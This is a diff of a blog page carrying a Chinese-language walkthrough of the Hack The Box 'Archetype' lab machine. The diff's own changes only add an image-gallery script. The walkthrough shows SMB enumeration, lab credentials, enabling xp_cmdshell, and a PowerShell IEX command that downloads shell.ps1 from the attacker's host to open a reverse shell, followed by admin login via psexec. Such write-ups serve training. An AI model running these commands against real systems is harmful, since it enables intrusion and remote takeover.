@@ -590,8 +590,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="HTB-Archetype-WriteUp"><a href="#HTB-Archetype-WriteUp" class="headerlink" title="HTB-Archetype WriteUp"></a>HTB-Archetype WriteUp</h2><h3 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h3><p><code>nmap -sV -sC 10.10.10.27</code></p>
-<img src="/images/20210313210153.png" style="zoom:67%;" />
+        <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="HTB-Archetype-WriteUp"><a href="#HTB-Archetype-WriteUp" class="headerlink" title="HTB-Archetype WriteUp"></a>HTB-Archetype WriteUp</h2><h3 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h3><p><code>nmap -sV -sC 10.10.10.27</code></p>
+<a href="/images/20210313210153.png" class="gallery-item"><img src="/images/20210313210153.png" style="zoom:67%;" /></a>
 
 <p>根据上图扫描结果，靶机开放了135、139、445、1433端口</p>
 <ul>
@@ -606,7 +606,7 @@
 </ul>
 <h3 id="445端口SMB文件共享"><a href="#445端口SMB文件共享" class="headerlink" title="445端口SMB文件共享"></a>445端口SMB文件共享</h3><p>先查看SMB的共享文件</p>
 <p><code>smbclient -L 10.10.10.27</code></p>
-<img src="/images/20210313204721.png" style="zoom:67%;" />
+<a href="/images/20210313204721.png" class="gallery-item"><img src="/images/20210313204721.png" style="zoom:67%;" /></a>
 
 <p>smb要求输入密码，但是直接按回车之后，也可以看到共享列表</p>
 <p>在图中可以看到backups为共享的对象为全体，直接访问backups文件夹</p>
@@ -614,10 +614,10 @@
 <p>回车</p>
 <p>然后用<code>ls</code>查看backups文件内容</p>
 <p>用<code>get</code>获取prod.dtsConfig文件</p>
-<img src="/images/20210313205904.png" style="zoom: 67%;" />
+<a href="/images/20210313205904.png" class="gallery-item"><img src="/images/20210313205904.png" style="zoom: 67%;" /></a>
 
 <p>prod.dtsConfig文件就下载到了我们服务器中</p>
-<img src="/images/20210313212722.png" style="zoom:67%;" />
+<a href="/images/20210313212722.png" class="gallery-item"><img src="/images/20210313212722.png" style="zoom:67%;" /></a>
 
 <p>在prod.dtsConfig文件中，可以找sql的User ID和Password</p>
 <p>SQL Server的身份验证方式有两种：操作系统身份验证和数据库身份验证</p>
@@ -629,17 +629,17 @@
 <p>然后利用mssqlclient和获取到的账号密码登入数据库</p>
 <p><code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p>
 <p><code>M3g4c0rp123</code></p>
-<img src="/images/Lily_Screenshot_1615812452.png" style="zoom:67%;" />
+<a href="/images/Lily_Screenshot_1615812452.png" class="gallery-item"><img src="/images/Lily_Screenshot_1615812452.png" style="zoom:67%;" /></a>
 
 <p>登入成功之后，我们需要测试一下该账号是否具有最高的sysadmin权限</p>
 <p><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code></p>
-<img src="/images/image-20210315205958962.png" style="zoom: 67%;" />
+<a href="/images/image-20210315205958962.png" class="gallery-item"><img src="/images/image-20210315205958962.png" style="zoom: 67%;" /></a>
 
 <p>结果显示，该账号确实具有sysadmin的权限，接下来启用xp_cmdshell获得RCE并反弹shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;Show Advanced Options&#x27;, 1; </span><br><span class="line">reconfigure; </span><br><span class="line">sp_configure;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">xp_cmdshell &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
 
 <p>其中执行whoami的结果显示如下</p>
-<img src="/images/image-20210315213821244.png" style="zoom:67%;" />
+<a href="/images/image-20210315213821244.png" class="gallery-item"><img src="/images/image-20210315213821244.png" style="zoom:67%;" /></a>
 
 <p>说明该账户在SQL服务中具有archetype\sql_svc，但是在host上不具有任何权限</p>
 <p>创建一个shell.ps1脚本，内容如下</p>
@@ -656,22 +656,27 @@
 <p>接下来进sql窗口执行下列命令</p>
 <p><code>xp_cmdshell &quot;Powershell &quot; IEX(New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.10:81/shell.ps1\&quot;);&quot;</code></p>
 <p>在http和nc窗口同时得到反馈</p>
-<p><img src="/images/image-20210413221428797.png"></p>
+<p><a href="/images/image-20210413221428797.png" class="gallery-item"><img src="/images/image-20210413221428797.png"></a></p>
 <p>在<code>\user\sql_svc\desktop</code>下获取user.txt</p>
-<img src="/images/image-20210413214419239.png" style="zoom:67%;" />
+<a href="/images/image-20210413214419239.png" class="gallery-item"><img src="/images/image-20210413214419239.png" style="zoom:67%;" /></a>
 
 <p>得到user flag <code>3e7b102e78218e935bf3f4951fec21a3</code></p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>前面得到的只是普通用户的账号，接下来可以通过type指令查看Powershell的历史记录文件</p>
 <p><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>
-<p><img src="/images/image-20210413215004497.png"></p>
+<p><a href="/images/image-20210413215004497.png" class="gallery-item"><img src="/images/image-20210413215004497.png"></a></p>
 <p>这表示backups对管理员账号进行了映射，我们可以用psexec.py来取得管理员权限</p>
 <p>接下来用管理员账号<code>administrator</code>和密码<code>MEGACORP_4dm1n!!</code>进行登入</p>
-<p><img src="/images/image-20210413221145501.png"></p>
+<p><a href="/images/image-20210413221145501.png" class="gallery-item"><img src="/images/image-20210413221145501.png"></a></p>
 <p>进入到管理员桌面，取得root.txt</p>
-<img src="/images/image-20210413215944832.png" style="zoom:50%;" />
+<a href="/images/image-20210413215944832.png" class="gallery-item"><img src="/images/image-20210413215944832.png" style="zoom:50%;" /></a>
 
 <p>提交flag<code>b91ccec3305e98240082d4474b848528</code>，完成Archetype机器</p>
-
+</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
     </div>
 
     
@@ -772,7 +777,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
